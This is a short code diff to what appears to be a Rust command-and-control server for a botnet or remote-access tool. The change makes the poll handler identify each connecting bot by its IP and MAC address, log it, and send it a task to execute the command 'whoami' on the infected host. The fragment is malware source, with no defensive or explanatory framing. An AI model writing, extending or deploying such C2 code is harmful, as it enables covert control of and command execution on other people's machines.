@@ -23,7 +23,9 @@ async fn handle_task_result(task_result: ProtoBuf<c2::TaskResult>) -> Result<Htt
     HttpResponse::Ok().protobuf(c2::Empty::default())
 }
 
-async fn handle_poll(_msg: ProtoBuf<c2::Empty>) -> Result<HttpResponse, Error> {
+async fn handle_poll(bot_id: ProtoBuf<c2::BotId>) -> Result<HttpResponse, Error> {
+    let id = utils::gen_uuid(&bot_id.ip, &bot_id.mac);
+    println!("got poll from id:{:?}", id);
     let mut res = c2::Task::default();
     let data = c2::task::Data::Execute(ExecuteReq {
         cmd: "whoami".to_string(),
